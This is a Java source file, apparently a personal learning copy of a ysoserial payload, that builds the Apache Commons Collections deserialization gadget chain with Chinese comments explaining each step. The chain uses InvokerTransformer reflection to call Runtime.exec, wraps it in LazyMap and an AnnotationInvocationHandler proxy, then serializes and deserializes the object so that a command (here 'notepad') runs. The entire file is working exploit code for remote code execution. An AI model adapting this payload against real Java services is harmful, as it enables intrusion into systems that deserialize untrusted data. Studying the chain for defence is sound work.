package ysoserial.payloads;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

/**
 * TransformedMap:用于对Java标准数据结构Map作修饰，被修饰过的Map在添加新的元素时，可以执行回调。
 * Transformer:一个接口，只有一个待实现的方法transform。
 *      public interface Transformer{
 *          public Object transform(Object input);
 *      }
 * ConstantTransformer:实现了Transformer接口的一个类，作用是包装任意一个对象，在执行回调的时候返回这个对象。
 * InvokerTransformer:三个参数:方法名，参数类型，参数,也实现了Transformer接口的transform方法。利用反射对传入的方法名，类型，参数执行。
 * ChainedTransformer:将多个内部Transformer链在一起，前一个回调的结果作为后一个回调的参数。
 */

public class MyCustom {
    public static void main(String[] args) throws Exception{
        Transformer[] transformers = new Transformer[]{
            /*
            new ConstantTransformer(Runtime.getRuntime()),
            new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"notepad"}),
            */
            //反射执行，不直接获取java.lang.Runtime对象，此对象无法序列化。
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[0]}),
            new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}),
            new InvokerTransformer("exec",new Class[]{String.class},new String[]{"notepad"}),
            new ConstantTransformer("hello world!")
        };
        Transformer transformerChain = new ChainedTransformer(transformers);

        Map innerMap = new HashMap();
        //innerMap.put("value","xxxx");

        //Map outerMap = TransformedMap.decorate(innerMap,null,transformerChain);
        //改为LazyMap
        Map outerMap = LazyMap.decorate(innerMap,transformerChain);

        //outerMap.put("test","xxx");//向Map中插入一个新map来触发回调。

        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor construct = clazz.getDeclaredConstructor(Class.class,Map.class);
        construct.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class,outerMap);

        Map proxymap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},handler);

        //real序列化的对象，被反序列化的时候通过gadget最终执行命令执行。
        handler = (InvocationHandler) construct.newInstance(Retention.class,proxymap);

        //Object obj = construct.newInstance(Retention.class,outerMap);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(handler);
        oos.close();

        System.out.println(baos);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(baos.toByteArray()));
        Object o = (Object) ois.readObject();


    }
}
